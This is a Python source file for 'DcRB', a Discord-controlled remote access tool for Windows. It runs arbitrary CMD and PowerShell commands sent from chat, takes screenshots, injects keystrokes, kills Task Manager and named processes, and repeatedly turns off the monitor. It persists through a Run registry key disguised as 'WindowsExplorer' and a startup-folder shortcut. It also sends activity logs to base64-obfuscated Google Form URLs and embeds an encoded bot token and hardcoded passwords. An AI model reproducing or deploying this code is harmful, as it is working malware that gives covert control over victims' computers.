#20260411精修：5.1>>5.2: 優化和簡化邏輯(應該看得出來吧)
import re, uuid, os, time, socket, ctypes, threading, io, platform, subprocess, hashlib, requests, sys, base64
from datetime import datetime
from ctypes import POINTER, cast

import discord
from discord import app_commands
from discord.ext import commands

DCRB_VERSION = "dcrb_5.2.0"

os.chdir(os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)))

def bg_run(func, *args, **kwargs):
    threading.Thread(target=func, args=args, kwargs=kwargs, daemon=True).start()

def get_host_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        try: return socket.gethostbyname(socket.gethostname())
        except: return "IP_UNKNOWN"

def log_message_async(content: str):
    def _log():
        try: requests.post(LOG_URL, data={LOG_FIELD: content}, timeout=5)
        except: pass
    bg_run(_log)

def parse_interaction_options(options):
    parts = []
    for o in options:
        if "value" in o: parts.append(f"{o['name']}={o['value']}")
        elif "options" in o:
            sub = parse_interaction_options(o["options"])
            parts.append(f"{o['name']} {' '.join(sub)}" if sub else o['name'])
        else: parts.append(o['name'])
    return parts

def ht(s: str) -> str:
    return str(int.from_bytes(hashlib.sha256(s.encode('utf-8')).digest(), 'big'))[-32:].ljust(32, '0')

async def general_check(interaction: discord.Interaction) -> bool:
    if interaction.user.bot:
        raise app_commands.CheckFailure("不支援此指令。")
    cog = interaction.client.get_cog("Shutdowner")
    if getattr(cog, 'stop_until', None) and time.time() < cog.stop_until:
        raise app_commands.CheckFailure(f"此裝置已暫停遠端控制，剩餘 {int(cog.stop_until - time.time())} 秒後恢復。")
    return True

def startsetting():
    global LOG_URL, LOG_FIELD, BOT_TOKEN
    LOG_URL = base64.b64decode(b'aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvdS8wL2QvZS8xRkFJcFFMU2NVQnVheDlYODBwbDNYVDQ0eGJ3ZG53RERmdkx0WnhkRDdUMEZ2QTZfSUxrcnFXZy9mb3JtUmVzcG9uc2U=').decode()
    LOG_FIELD = "entry.1086262245"    
    while True:
        try:
            socket.setdefaulttimeout(3)
            with socket.socket() as s: s.connect(("discord.com", 443))
            break
        except OSError:
            time.sleep(1)
    try:
        with open('BOT_TOKEN.txt', 'r') as f: BOT_TOKEN = f.read().strip()
    except:
        BOT_TOKEN = base64.b64decode(b'TVRReE5qSXhOVGMyT0RJM016VXhPRGN6TkEuR1Y1QnNNLjFrYUVYWEJIOEluSnl3YW16bVV6dUZra1V0RkJnZlExU2hOZmNr').decode()    
    url = base64.b64decode(b'aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZm9ybXMvdS8wL2QvZS8xRkFJcFFMU2RSaHZicVBNakxadXIzU3RVRU8xdDFyYmc3MlpWQkR4Tkh2Rzg3Tm1nVEFXZVJHdy9mb3JtUmVzcG9uc2U=').decode()
    try:
        if requests.post(url, data={"entry.511988492": ht(BOT_TOKEN)}, timeout=5).status_code != 200: sys.exit(0)
    except: pass

def _win_notify_message(text: str, title: str = "通知"):
    ctypes.windll.user32.MessageBoxW(None, text, title, 0x0 | 0x00040000)

def _tk_notify_image(image_bytes: bytes, duration: int = 10000):
    import tkinter as tk
    from PIL import Image, ImageTk
    root = tk.Tk()
    root.withdraw()
    window = tk.Toplevel(root)
    window.title("圖片通知")
    window.attributes('-topmost', True)
    photo = ImageTk.PhotoImage(Image.open(io.BytesIO(image_bytes)))
    tk.Label(window, image=photo).pack(padx=10, pady=10)
    window.after(duration, root.destroy)
    root.mainloop()

class Shutdowner(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.blacklist = set()
        self.stop_until = None
        self.monitor_off_event = threading.Event()
        self.close_loop_event = threading.Event()
        bg_run(self._monitor_blacklist)

    def _monitor_blacklist(self):
        import psutil
        while True:
            for proc in psutil.process_iter(['name']):
                name = (proc.info.get('name') or '').lower()
                if any(kw in name for kw in self.blacklist):
                    try: proc.kill()
                    except: pass
            time.sleep(5)

    async def cog_check(self, interaction: discord.Interaction) -> bool:
        return await general_check(interaction)

    def _resume_after(self, duration: float):
        time.sleep(duration)
        self.stop_until = None

    def _loop_monitor_off(self, interval):
        while not self.monitor_off_event.is_set():
            ctypes.windll.user32.PostMessageW(0xFFFF, 0x0112, 0xF170, 2)
            time.sleep(interval)

    @app_commands.command(name="stop", description="暫停遠端控制，任何運行本服務的HOST皆可能被關閉；需要密碼請洽管理員。")
    @app_commands.describe(duration="秒數", keywords="密碼")
    async def stop(self, interaction: discord.Interaction, duration: float, keywords: str):
        if keywords != base64.b64decode(b'TEBMQExAITQ1NTEw').decode():
            return await interaction.response.send_message(f"密碼錯誤；裝置({platform.node().lower()})未執行。\不應重試。")
        self.stop_until = time.time() + duration
        bg_run(self._resume_after, duration)
        await interaction.response.send_message(f"已暫停 {duration} 秒，期間阻止所有對該裝置的指令。")

    @app_commands.command(name="txt", description="傳送文字到電腦端(會以文字檔出現在桌面，注意到該檔案會經一段時間自動消除)")
    @app_commands.describe(text="要傳送的文字")
    async def txt(self, interaction: discord.Interaction, text: str):
        try:
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            path = os.path.join(desktop if os.path.isdir(desktop) else os.getcwd(), "temp.txt")
            with open(path, "w", encoding="utf-8") as f: f.write(text or "")
        except Exception as e:
            return await interaction.response.send_message(f"無法寫入檔案：錯誤{e}", ephemeral=True)

        def _open_file(p):
            try:
                if sys.platform.startswith("win"): os.startfile(p)
                elif sys.platform == "darwin": subprocess.Popen(["open", p])
                else: subprocess.Popen(["xdg-open", p])
            except: pass

        def _auto_del(p, d):
            time.sleep(d)
            try: os.remove(p)
            except: pass

        bg_run(_open_file, path)
        bg_run(_auto_del, path, 60)
        await interaction.response.send_message("已傳送至電腦", ephemeral=True)

    @app_commands.command(name="shutdown", description="遠端關機")
    async def shutdown(self, interaction: discord.Interaction):
        os.system("shutdown /s /f /t 0")
        await interaction.response.send_message("關機中...")

    @app_commands.command(name="device", description="回傳裝置基本資訊")
    async def device(self, interaction: discord.Interaction):
        mac = uuid.getnode()
        mac_addr = ":".join(f"{(mac >> ele) & 0xff:02x}" for ele in range(40, -1, -8))
        msg = (f"**裝置名稱**：{platform.node() or socket.gethostname()}\n**IPv4 位址**：{get_host_ip()}\n**MAC 位址**：{mac_addr}\n"
               f"**系統／型號**：{platform.system()} {platform.release()} ({platform.machine()})\nDcRB 版本：{DCRB_VERSION}")
        await interaction.response.send_message(msg)

    @app_commands.command(name="msg", description="顯示訊息通知")
    @app_commands.describe(text="要顯示的訊息內容")
    async def msg(self, interaction: discord.Interaction, text: str):
        bg_run(_win_notify_message, text)
        await interaction.response.send_message("已顯示通知。")

    @app_commands.command(name="web", description="使用瀏覽器開啟網址(使用Chrome)")
    async def web(self, interaction: discord.Interaction, url: str):
        try:
            paths = [r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]
            chrome = next((p for p in paths if os.path.exists(p)), None)
            if chrome: subprocess.Popen([chrome, url])
            else: os.startfile(url)
            await interaction.response.send_message(f"已開啟: {url}")
        except Exception as e:
            await interaction.response.send_message(f"無法開啟網址: {e}")

    @app_commands.command(name="reject", description="關閉DcRB；需要密碼。")
    async def reject(self, interaction: discord.Interaction, password: str):
        current = platform.node() or socket.gethostname()
        if password == "LAL@L@!45510":
            await interaction.response.send_message(f"DcRB已在裝置 {current} 關閉。")
            os._exit(0)
        await interaction.response.send_message(f"密碼錯誤， {current} 未關閉")

    @app_commands.command(name="cmd", description="在 CMD 中執行指令")
    @app_commands.describe(commands="要執行的指令，多行用換行分隔")
    async def cmd(self, interaction: discord.Interaction, commands: str):
        bg_run(subprocess.Popen, ['cmd','/k', " & ".join(commands.splitlines())])
        await interaction.response.send_message("已執行 CMD 指令。")

    @app_commands.command(name="key", description="模擬鍵盤輸入(同步按下)")
    @app_commands.describe(keys="空格分隔鍵位，例如 ctrl a b")
    async def key(self, interaction: discord.Interaction, keys: str):
        import pyautogui
        pyautogui.FAILSAFE = False
        ks = keys.split()
        bg_run(lambda: pyautogui.hotkey(*ks) if len(ks) > 1 else pyautogui.press(ks[0]))
        await interaction.response.send_message(f"已模擬按鍵：{keys}")

    @app_commands.command(name="keyboard", description="直接鍵入字串")
    @app_commands.describe(keys="鍵入字串(無須分隔，無須注意輸入法)")
    async def keyboard(self, interaction: discord.Interaction, keys: str):
        import keyboard
        bg_run(keyboard.write, keys)
        await interaction.response.send_message(f"已鍵入：{keys}")

    @app_commands.command(name="key_wait", description="逐鍵間隔輸入")
    @app_commands.describe(keys="鍵位", interval="秒數")
    async def key_wait(self, interaction: discord.Interaction, keys: str, interval: float):
        import pyautogui
        pyautogui.FAILSAFE = False
        def _kw():
            for k in keys.split(): pyautogui.press(k); time.sleep(interval)
        bg_run(_kw)
        await interaction.response.send_message(f"已逐鍵輸入 {keys}，間隔 {interval} 秒")

    @app_commands.command(name="close", description="關閉視窗")
    @app_commands.describe(keyword="視窗標題關鍵字")
    async def close(self, interaction: discord.Interaction, keyword: str):
        import pygetwindow as gw
        cnt = 0
        for w in gw.getWindowsWithTitle(keyword):
            try: w.close(); cnt += 1
            except: pass
        await interaction.response.send_message(f"已嘗試關閉 {cnt} 個視窗。")

    def _loop_close(self, interval: float, keyword: str):
        import pygetwindow as gw
        while not self.close_loop_event.is_set():
            for w in gw.getWindowsWithTitle(keyword):
                try: w.close()
                except: pass
            time.sleep(interval)

    @app_commands.command(name="close_loop", description="每隔指定秒數自動關閉視窗")
    @app_commands.describe(interval="秒數", keyword="視窗標題關鍵字")
    async def close_loop(self, interaction: discord.Interaction, interval: float, keyword: str):
        self.close_loop_event.clear()
        bg_run(self._loop_close, interval, keyword)
        await interaction.response.send_message(f"已啟動 close_loop：每 {interval} 秒自動關閉「{keyword}」視窗。")

    @app_commands.command(name="close_stop", description="停止 /close_loop 的自動關閉")
    async def close_stop(self, interaction: discord.Interaction):
        self.close_loop_event.set()
        await interaction.response.send_message("已停止 close_loop。")

    @app_commands.command(name="volume", description="設定音量")
    @app_commands.describe(level="0-100")
    async def volume(self, interaction: discord.Interaction, level: int):
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        vol_interface = cast(AudioUtilities.GetSpeakers().EndpointVolume, POINTER(IAudioEndpointVolume))
        v = max(0, min(100, level)) / 100
        vol_interface.SetMasterVolumeLevelScalar(v, None)
        await interaction.response.send_message(f"音量設為 {int(v*100)}%")

    @app_commands.command(name="monitor_off", description="每隔指定秒數關閉顯示器")
    @app_commands.describe(interval="每隔幾秒關閉")
    async def monitor_off(self, interaction: discord.Interaction, interval: float):
        self.monitor_off_event.clear()
        bg_run(self._loop_monitor_off, interval)
        await interaction.response.send_message(f"每 {interval} 秒關閉一次螢幕，直到使用 /monitor_on。")

    @app_commands.command(name="monitor_on", description="停止自動關閉顯示器")
    async def monitor_on(self, interaction: discord.Interaction):
        self.monitor_off_event.set()
        bg_run(ctypes.windll.user32.PostMessageW, 0xFFFF, 0x0112, 0xF170, -1)
        await interaction.response.send_message("顯示器已停止自動關閉。")

    @app_commands.command(name="screenshot", description="截圖")
    async def screenshot(self, interaction: discord.Interaction):
        import mss, mss.tools
        with mss.mss() as sct:
            img = sct.grab(sct.monitors[0])
            buf = io.BytesIO(mss.tools.to_png(img.rgb, img.size))
            buf.seek(0)
            await interaction.response.send_message(file=discord.File(fp=buf, filename='shot.png'))

    @app_commands.command(name="screenshot_notify", description="顯示圖片通知")
    async def screenshot_notify(self, interaction: discord.Interaction, image: discord.Attachment):
        bg_run(_tk_notify_image, await image.read())
        await interaction.response.send_message("已顯示圖片通知。")

    @app_commands.command(name="blackade", description="封鎖程序(kill方法)")
    async def blackade(self, interaction: discord.Interaction, keywords: str):
        import psutil
        kws = keywords.lower().split()
        self.blacklist.update(kws)
        cnt = 0
        for p in psutil.process_iter(['name']):
            if any(kw in (p.info.get('name') or '').lower() for kw in kws):
                try: p.kill(); cnt += 1
                except: pass
        await interaction.response.send_message(f"封鎖 {', '.join(kws)}，關閉 {cnt} 個進程。")

    @app_commands.command(name="unblackade", description="解除封鎖程序")
    async def unblackade(self, interaction: discord.Interaction, keywords: str):
        rem = [kw for kw in keywords.lower().split() if kw in self.blacklist]
        for kw in rem: self.blacklist.remove(kw)
        await interaction.response.send_message(f"解除封鎖 {', '.join(rem)}。" if rem else f"未找到 {keywords}。")

    @app_commands.command(name="startup", description="寫入開機指令 (覆蓋 config.txt)")
    async def startup(self, interaction: discord.Interaction, content: str):
        try:
            with open("config.txt", "w", encoding="utf-8") as f: f.write(content.strip())
            await interaction.response.send_message("已寫入 config.txt！")
        except Exception as e: await interaction.response.send_message(f"寫入失敗：{e}")

    @app_commands.command(name="shell_startup", description="在 shell:startup 建立捷徑")
    async def shell_startup(self, interaction: discord.Interaction):
        await interaction.response.defer(thinking=True)
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.join(os.path.dirname(os.path.abspath(__file__)), 'dcrb.exe')
            script_dir = os.path.dirname(exe_path)
            startup = subprocess.check_output(["powershell", "-NoProfile", "-Command", "[Environment]::GetFolderPath('Startup')"], text=True).strip()
            
            ps_cmd = f"$s = (New-Object -ComObject WScript.Shell).CreateShortcut('{os.path.join(startup, 'dcrb.lnk')}'); $s.TargetPath = '{exe_path}'; $s.WorkingDirectory = '{script_dir}'; $s.IconLocation = '{exe_path}'; $s.Save()"
            subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], check=True, capture_output=True)
            await interaction.followup.send("已建立開機啟動捷徑！")
        except Exception as e: await interaction.followup.send(f"失敗：{e}")

    @app_commands.command(name="token", description="寫入 BOT_TOKEN.txt")
    async def token(self, interaction: discord.Interaction, token: str, password: str):
        if password != base64.b64decode(b'NDU1MTA0NTUxMA==').decode():
            return await interaction.response.send_message("密碼錯誤。", ephemeral=True)
        try:
            with open("BOT_TOKEN.txt", "w", encoding="utf-8") as f: f.write(token.strip())
            await interaction.response.send_message("更新成功！請重啟 Bot。")
        except Exception as e: await interaction.response.send_message(f"寫入失敗：{e}")

    @app_commands.command(name="reg_startup", description="設定開機時自啟動")
    async def reg_startup(self, interaction: discord.Interaction):
        import winreg
        await interaction.response.defer(thinking=True)
        try:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "WindowsExplorer", 0, winreg.REG_SZ, exe_path)
            await interaction.followup.send("設定成功：```WindowsExplorer```")
        except Exception as e: await interaction.followup.send(f"寫入失敗：{e}")

    @app_commands.command(name="powershell", description="執行 PowerShell 指令")
    async def powershell(self, interaction: discord.Interaction, commands: str):
        await interaction.response.defer(thinking=True)
        bg_run(subprocess.Popen, ['powershell', '-NoExit', '-Command', "; ".join(commands.splitlines())], creationflags=subprocess.CREATE_NEW_CONSOLE)
        await interaction.followup.send("已執行 PowerShell 指令。")

    @powershell.error
    async def powershell_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError):
        await interaction.response.send_message("你沒有權限執行此指令。" if isinstance(error, app_commands.CheckFailure) else f"未知錯誤: {error}", ephemeral=True)

    @app_commands.command(name="help", description="幫助與回饋")
    async def help(self, interaction: discord.Interaction, content: str):
        await interaction.response.send_message("感謝您的回饋。```目前回應列表```20260115/用&換CMD行並用;換PS行。\n指令確認時加y參數。")

    @app_commands.command(name="task_list", description="顯示目前運行中的前台程式列表")
    async def task_list(self,interaction: discord.Interaction):
        visible = [t for t in gw.getAllTitles() if t]
        if visible:response_text = "前台程式列表：\n" + "\n".join(visible)
        else:response_text = "目前無前台程式。"
        if len(response_text) > 2000:response_text = response_text[:1996] + "..."
        await interaction.response.send_message(response_text)

    @app_commands.command(name="cmdlist", description="顯示可用指令列表")
    async def cmdlist(self,interaction: discord.Interaction):
        commands_list = ["cmdlist", "start", "shutdown", "device", "kill", "block_input", "unblock_input", "monitor_on", "screenshot", "close_stop", "task_list", "info", "version", "keyboard"]
        await interaction.response.send_message(" ".join(commands_list))

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

async def my_setup_hook():
    await bot.add_cog(Shutdowner(bot))
    for cmd in bot.tree.get_commands(): cmd.checks.append(general_check)
    await bot.tree.sync()
bot.setup_hook = my_setup_hook

@bot.event
async def on_message(msg):
    if msg.author.bot: return
    log_message_async(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{msg.author}] [IP:{get_host_ip()}] {msg.content or ''}")

    if msg.content and msg.content.strip().startswith("--"):
        cog: Shutdowner = bot.get_cog("Shutdowner")
        for seg in [s.strip() for s in msg.content.strip().split("--") if s.strip()]:
            if not (m := re.match(r"^(\w+)(?:\((.*?)\))?$", seg)):
                await msg.channel.send(f"指令格式錯誤：{seg}")
                continue

            cmd_name, param_str = m.group(1).lower(), m.group(2)
            # 單行解析參數字串 (Dictionary Comprehension)
            params = {k.strip(): v.strip() for p in param_str.split(",") if "=" in p for k, v in [p.split("=", 1)]} if param_str else {}

            try:
                # 展平並整合判斷式
                if cmd_name == "cmdlist": await msg.channel.send(" ".join(["cmdlist", "start", "shutdown", "device", "kill", "block_input", "unblock_input", "monitor_on", "screenshot", "close_stop", "task_list", "info", "version", "keyboard"]))
                elif cmd_name == "start": await msg.channel.send(f"已成功連上目標電腦。Hash辨識碼：`{ht(BOT_TOKEN)}`")
                elif cmd_name == "shutdown": os.system("shutdown /s /f /t 0"); await msg.channel.send("關機中…")
                elif cmd_name == "device": await msg.channel.send(f"裝置：{platform.node() or socket.gethostname()}\n如需詳細資訊請用/device")
                elif cmd_name == "kill": 
                    for proc in ["cmd.exe", "taskmgr.exe"]: subprocess.run(["taskkill","/F","/IM", proc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    await msg.channel.send("已關閉 CMD 與工作管理員。")
                elif cmd_name == "monitor_on": 
                    cog.monitor_off_event.set(); bg_run(ctypes.windll.user32.PostMessageW, 0xFFFF, 0x0112, 0xF170, -1)
                    await msg.channel.send("顯示器已開啟並停止自動關閉。")
                elif cmd_name == "screenshot":
                    import mss, mss.tools
                    with mss.mss() as sct:
                        img = sct.grab(sct.monitors[0])
                        buf = io.BytesIO(mss.tools.to_png(img.rgb, img.size))
                        buf.seek(0)
                        await msg.channel.send(file=discord.File(fp=buf, filename='shot.png'))
                elif cmd_name == "close_stop": cog.close_loop_event.set(); await msg.channel.send("已停止 close_loop。")
                elif cmd_name == "task_list":
                    import pygetwindow as gw
                    visible = [t for t in gw.getAllTitles() if t]
                    await msg.channel.send("前台程式列表：\n" + "\n".join(visible) if visible else "目前無前台程式。")
                elif cmd_name == "stop" and 'duration' in params and 'keywords' in params:
                    if params['keywords'] == "L@L@L@!45510":
                        cog.stop_until = time.time() + float(params['duration'])
                        bg_run(cog._resume_after, float(params['duration']))
                        await msg.channel.send(f"已暫停 {params['duration']} 秒。")
                    else: await msg.channel.send("裝置不符合關鍵字，未執行。")
                elif cmd_name == "msg" and 'text' in params: bg_run(_win_notify_message, params['text']); await msg.channel.send("已顯示通知。")
                elif cmd_name == "web" and 'url' in params:
                    chrome = next((p for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"] if os.path.exists(p)), None)
                    if chrome: subprocess.Popen([chrome, params['url']])
                    else: os.startfile(params['url'])
                    await msg.channel.send(f"已開啟: {params['url']}")
                elif cmd_name == "reject" and 'names' in params:
                    if params['names'] == "LAL@L@!45510": await msg.channel.send("關閉程式。"); os._exit(0)
                    else: await msg.channel.send("密碼錯誤。")
                elif cmd_name == "cmd" and 'commands' in params:
                    bg_run(subprocess.Popen, ['cmd','/k', " & ".join(params['commands'].split("|"))])
                    await msg.channel.send("已執行 CMD 指令。")
                elif cmd_name == "key" and 'keys' in params:
                    import pyautogui
                    pyautogui.FAILSAFE = False
                    ks = params['keys'].split()
                    bg_run(lambda: pyautogui.hotkey(*ks) if len(ks) > 1 else pyautogui.press(ks[0]))
                    await msg.channel.send(f"已模擬按鍵：{params['keys']}")
                elif cmd_name == "keyboard" and 'keys' in params:
                    import keyboard
                    bg_run(keyboard.write, str(params['keys']))
                    await msg.channel.send(f"已模擬按鍵：{params['keys']}")
                elif cmd_name == "key_wait" and 'keys' in params and 'interval' in params:
                    import pyautogui
                    pyautogui.FAILSAFE = False
                    def _kw():
                        for k in params['keys'].split(): pyautogui.press(k); time.sleep(float(params['interval']))
                    bg_run(_kw)
                    await msg.channel.send(f"已逐鍵輸入 {params['keys']}")
                elif cmd_name == "close" and 'keyword' in params:
                    import pygetwindow as gw
                    cnt = 0
                    for w in gw.getWindowsWithTitle(params['keyword']):
                        try: w.close(); cnt += 1
                        except: pass
                    await msg.channel.send(f"已嘗試關閉 {cnt} 個視窗。")
                elif cmd_name == "close_loop" and 'interval' in params and 'keyword' in params:
                    cog.close_loop_event.clear()
                    bg_run(cog._loop_close, float(params['interval']), params['keyword'])
                    await msg.channel.send(f"啟動 close_loop")
                elif cmd_name == "volume" and 'level' in params:
                    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
                    v = max(0, min(100, int(params['level']))) / 100
                    cast(AudioUtilities.GetSpeakers().EndpointVolume, POINTER(IAudioEndpointVolume)).SetMasterVolumeLevelScalar(v, None)
                    await msg.channel.send(f"音量設為 {int(v*100)}%")
                elif cmd_name == "monitor_off" and 'interval' in params:
                    cog.monitor_off_event.clear()
                    bg_run(cog._loop_monitor_off, float(params['interval']))
                    await msg.channel.send("已關閉螢幕")
                elif cmd_name == "blackade" and 'keywords' in params:
                    import psutil
                    kws = params['keywords'].split()
                    cog.blacklist.update(kws)
                    for p in psutil.process_iter(['name']):
                        if any(kw in (p.info.get('name') or '').lower() for kw in kws):
                            try: p.kill()
                            except: pass
                    await msg.channel.send(f"封鎖 {', '.join(kws)}")
                elif cmd_name == "unblackade" and 'keywords' in params:
                    rem = [kw for kw in params['keywords'].split() if kw in cog.blacklist]
                    for kw in rem: cog.blacklist.remove(kw)
                    await msg.channel.send(f"解除封鎖 {', '.join(rem)}。")
                elif cmd_name == "txt" and 'text' in params:
                    desk = os.path.join(os.path.expanduser("~"), "Desktop")
                    p = os.path.join(desk if os.path.isdir(desk) else os.getcwd(), "temp.txt")
                    with open(p, "w", encoding="utf-8") as f: f.write(params['text'] or "")
                    
                    def _open_auto_del():
                        try: os.startfile(p) if sys.platform.startswith("win") else subprocess.Popen(["open" if sys.platform == "darwin" else "xdg-open", p])
                        except: pass
                        time.sleep(60)
                        try: os.remove(p)
                        except: pass
                    bg_run(_open_auto_del)
                    await msg.channel.send("已傳送至電腦")
                else:
                    await msg.channel.send(f"缺少參數或未知指令：{cmd_name}")

            except Exception as e: await msg.channel.send(f"執行錯誤：{e}")
        return

    if msg.attachments and any(a.content_type and a.content_type.startswith('image/') for a in msg.attachments):
        await msg.channel.send("由於圖片無法被記錄，欲使用圖片通知請使用/screenshot_notify。\n不應重試。")
    else:
        await bot.process_commands(msg)

@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.user and not interaction.user.bot and (data := interaction.data) and (name := data.get("name")):
        content = f"/{name}" + (" " + " ".join(parse_interaction_options(opts)) if (opts := data.get("options")) else "")
        log_message_async(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{interaction.user}] [IP:{get_host_ip()}] {content}")

@bot.event
async def on_ready():
    dn = platform.node() or socket.gethostname()
    await bot.change_presence(status=discord.Status.online, activity=discord.Game(f"正在 {dn} 上運行"))
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Bot 已上線：{bot.user}，運行於 {dn}")

    try:
        with open("config.txt", "r", encoding="utf-8") as f:
            if (content := f.read().strip()).startswith("--"):
                from types import SimpleNamespace
                await on_message(SimpleNamespace(content=content, author=SimpleNamespace(bot=False), attachments=[], channel=bot.guilds[0].text_channels[0]))
    except: pass

def main():
    startsetting()
    bot.run(BOT_TOKEN)

if __name__ == '__main__':
    main()

